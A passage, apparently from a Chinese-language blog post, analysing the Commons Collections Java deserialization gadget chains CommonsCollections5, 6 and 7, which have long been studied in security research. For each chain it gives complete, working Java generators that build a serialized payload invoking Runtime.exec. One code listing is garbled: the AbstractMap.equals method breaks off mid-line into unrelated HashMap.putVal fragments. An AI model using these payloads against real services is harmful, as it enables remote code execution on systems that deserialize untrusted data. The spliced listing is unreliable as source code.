                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Class.getMethod()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.getRuntime()
                                InvokerTransformer.transform()
                                    Method.invoke()
                                        Runtime.exec()
从注释里面还可以得到, 这个 chain 只能用于 >= 8u76, 且 SecurityManager 未设置的情况下使用.  
原因是在 8u76 的更新里面, 添加了 `javax.management.BadAttributeValueExpException` 的
readObject 方法
    private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get("val", null);
        if (valObj == null) {
            val = null;
        } else if (valObj instanceof String) {
            val= valObj;
        } else if (System.getSecurityManager() == null
                || valObj instanceof Long
                || valObj instanceof Integer
                || valObj instanceof Float
                || valObj instanceof Double
                || valObj instanceof Byte
                || valObj instanceof Short
                || valObj instanceof Boolean) {
            val = valObj.toString();
        } else { // the serialized object is from a version without JDK-8019292 fix
            val = System.identityHashCode(valObj) + "@" + valObj.getClass().getName();
        }
    }
可以看到, 在 `System.getSecurityManager() == null` 的情况下, 将会不管 valObj 的类型, 调用
toString 方法, 这里需要配合 `org.apache.commons.collections.keyvalue.TiedMapEntry`
来使用, 其重写的 toString 方法
    public Object getValue() {
        return this.map.get(this.key);
    }
    public String toString() {
        return this.getKey() + "=" + this.getValue();
    }
看到熟悉的 map.get 了么, 这里就又回到了 LazyMap 的那一套, 接下来也不用多说了, exp 如下:
    package demo.rmb122;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import javax.management.BadAttributeValueExpException;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    import java.util.Map;
    public class CommonsCollections5 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/touch", "/dev/shm/asdasd_1"}}),
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
            HashMap hashMap = new HashMap();
            Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "placeholder");
            BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException("placeholder");
            Field field = badAttributeValueExpException.getClass().getDeclaredField("val");
            field.setAccessible(true);
            field.set(badAttributeValueExpException, tiedMapEntry);
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(badAttributeValueExpException);
            oos.close();
        }
    }
另外, 这一条链, 其实 3, 4 都能使用, 不过 ysoseiral 只在 exp 里面写了 3 的, 实际上只要将 import 的
xxx.collections.xxx 全改成 xxx.collections4.xxx, 然后将 `LazyMap.decorate` 改为
`LazyMap.LazyMap` 就能直接给 4 使用.
## CommonsCollections6
还是先看调用栈:
    Gadget chain:
        java.io.ObjectInputStream.readObject()
            java.util.HashSet.readObject()
                java.util.HashMap.put()
                java.util.HashMap.hash()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()
                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()
                        org.apache.commons.collections.map.LazyMap.get()
                            org.apache.commons.collections.functors.ChainedTransformer.transform()
                            org.apache.commons.collections.functors.InvokerTransformer.transform()
                            java.lang.reflect.Method.invoke()
                                java.lang.Runtime.exec()
这条与 CommonsCollections5 类似, 触发点由 BadAttributeValueExpException 改为 HashSet, 这里与
URLDNS 类似, 在反序列化时会重新计算对象的 hashCode, 而刚刚好 TiedMapEntry 的 hashCode 里面与 toString
一样也用到了 getValue.
    public int hashCode() {
            Object value = this.getValue();
            return (this.getKey() == null ? 0 : this.getKey().hashCode()) ^ (value == null ? 0 : value.hashCode());
        }
不过这里比较奇怪的是 HashMap 就已经有 hashCode 了, 不知道为什么还要再套一层 HashSet. 我自己重新编写的时候是直接用的
HashMap 作为触发点.
exp 如下:
    package demo.rmb122;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    public class CommonsCollections6 {
        public static void main(String[] args) throws Exception {
            Transformer[] fake = new Transformer[]{
                    new ConstantTransformer("placeholder"),
            };
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/touch", "/dev/shm/asdasd_1"}}),
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(fake);
            HashMap innerMap = new HashMap();
            LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, chainedTransformer);
            TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "placeholder");
            HashMap hashMap = new HashMap();
            hashMap.put(tiedMapEntry, "zzzz");
            Field field = chainedTransformer.getClass().getDeclaredField("iTransformers"); // 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            innerMap.clear(); // 清除 LazyMap 产生的缓存
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(hashMap);
        }
    }
同样, 这套 exp 在 3, 4 都是通用的, 只需要更改 `LazyMap.decorate` 即可, 在 4 中是
`LazyMap.LazyMap`, 效果是是一样的, 只是方法名换了一个.
## CommonsCollections7
仍然先看调用栈:
    Payload method chain:
        java.util.Hashtable.readObject
        java.util.Hashtable.reconstitutionPut
        org.apache.commons.collections.map.AbstractMapDecorator.equals
        java.util.AbstractMap.equals
        org.apache.commons.collections.map.LazyMap.get
        org.apache.commons.collections.functors.ChainedTransformer.transform
        org.apache.commons.collections.functors.InvokerTransformer.transform
        java.lang.reflect.Method.invoke
        sun.reflect.DelegatingMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke
        sun.reflect.NativeMethodAccessorImpl.invoke0
        java.lang.Runtime.exec
仍然是用 LazyMap 导致 RCE, 相比 TransformingComparator, LazyMap 在 3, 4 中都可以用, 泛用性会更好.
这里触发 Lazy.get 的方式是利用 HashMap/Hashtable readObject 会重建内部的哈希表的特性. 在遇到 hash
碰撞的时候, 会调用其中一个对象的 equals 方法来对比两个对象是否相同来判断是否真的是 hash 碰撞. 在这之中使用的是父类
`AbstractMap` 的 equals 方法.
    public boolean equals(Object o) {
        if (o == this)
            return true;
        if (!(o instanceof Map))
            return false;
        Map m = (Map) o;
        if (m.size() != size())
            return false;
        try {
            for (Entry e : entrySet()) {
                K key = e.getKey();
                V value = e.getValue();
                if (value == null) {
                    if (!(m.get(key) == null && m.containsKey(key)))
                        return false;
                } else {
                    if (!value.equals(m.get(key))) // [] tab; Node p; int n, i;
        if ((tab = table) == null || (n = tab.length) == 0)
            n = (tab = resize()).length;
        if ((p = tab[i = (n - 1) & hash]) == null)
            tab[i] = newNode(hash, key, value, null);
        else {
            Node e; K k;
            if (p.hash == hash &&
                ((k = p.key) == key || (key != null && key.equals(k))))  // )p).putTreeVal(this, tab, hash, key, value);
            else {
                for (int binCount = 0; ; ++binCount) {
                    if ((e = p.next) == null) {
                        p.next = newNode(hash, key, value, null);
                        if (binCount >= TREEIFY_THRESHOLD - 1) // -1 for 1st
                            treeifyBin(tab, hash);
                        break;
                    }
                    if (e.hash == hash &&
                        ((k = e.key) == key || (key != null && key.equals(k))))
                        break;
                    p = e;
                }
            }
            if (e != null) { // existing mapping for key
                V oldValue = e.value;
                if (!onlyIfAbsent || oldValue == null)
                    e.value = value;
                afterNodeAccess(e);
                return oldValue;
            }
        }
        ++modCount;
        if (++size > threshold)
            resize();
        afterNodeInsertion(evict);
        return null;
    }
最后 exp 如下:
    package demo.rmb122;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.FileOutputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.Field;
    import java.util.HashMap;
    public class CommonsCollections7 {
        public static void main(String[] args) throws Exception {
            Transformer[] fake = new Transformer[]{
                    new ConstantTransformer("placeholder"),
            };
            Transformer[] transformers = new Transformer[]{
                    new ConstantTransformer(java.lang.Runtime.class),
                    new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[]{}}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[]{}}),
                    new InvokerTransformer("exec", new Class[]{String[].class}, new Object[]{new String[]{"/bin/touch", "/dev/shm/asdasd_1"}}),
            };
            ChainedTransformer chainedTransformer = new ChainedTransformer(fake);
            HashMap innerMap1 = new HashMap();
            innerMap1.put("yy", "1"); // "yy".hashCode() == "zZ".hashCode() == 3872
            HashMap innerMap2 = new HashMap();
            innerMap2.put("zZ", "1");
            LazyMap lazyMap1 = (LazyMap) LazyMap.decorate(innerMap1, chainedTransformer);
            LazyMap lazyMap2 = (LazyMap) LazyMap.decorate(innerMap2, chainedTransformer);
            HashMap hashMap = new HashMap();
            hashMap.put(lazyMap1, "placeholder");
            hashMap.put(lazyMap2, "placeholder");
            innerMap1.remove("zZ"); // 在 put 的时候产生碰撞, 根据上面的分析调用 LazyMap.get, LazyMap 会将结果存入 innerMap 中缓存, 所以这里需要将其清除, 否则 hashcode 就不一样了 
            Field field = chainedTransformer.getClass().getDeclaredField("iTransformers"); // 同上, 将真正的 transformers 设置, 不然在生成 exp 时就会执行命令, 自己打自己了
            field.setAccessible(true);
            field.set(chainedTransformer, transformers);
            ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
            oos.writeObject(hashMap);
        }
    }
## 总结
可以看到这些 chain 最后均需要经过 InvokerTransformer 或者 InstantiateTransformer. commons-collections 的修复也是着力于重点, 直接 ban 掉这两个类的 readObject, 一劳永逸.  
而这些中对于 commons-collections4, 比较实用的是 CommonsCollections2, CommonsCollections4.
对于 commons-collections3, 为 CommonsCollections6, CommonsCollections7. 利用能否成功只与
commons-collections 自身的版本有关, 而与 jre 的版本没有太大关系, 只要不要是远古版本即可. 而且实际上不少 chain
是两者都通用的, 只不过 ysoserial 没有编写, 只需要稍稍修改就行.  
另外在反序列化利用过程中, 会有各种相对比较晦涩但经常用到的的概念, 比如代理, ClassLoader, 反射等等. 如果能通过这个机会学习上,
相信会有机会在未来的某一天用上.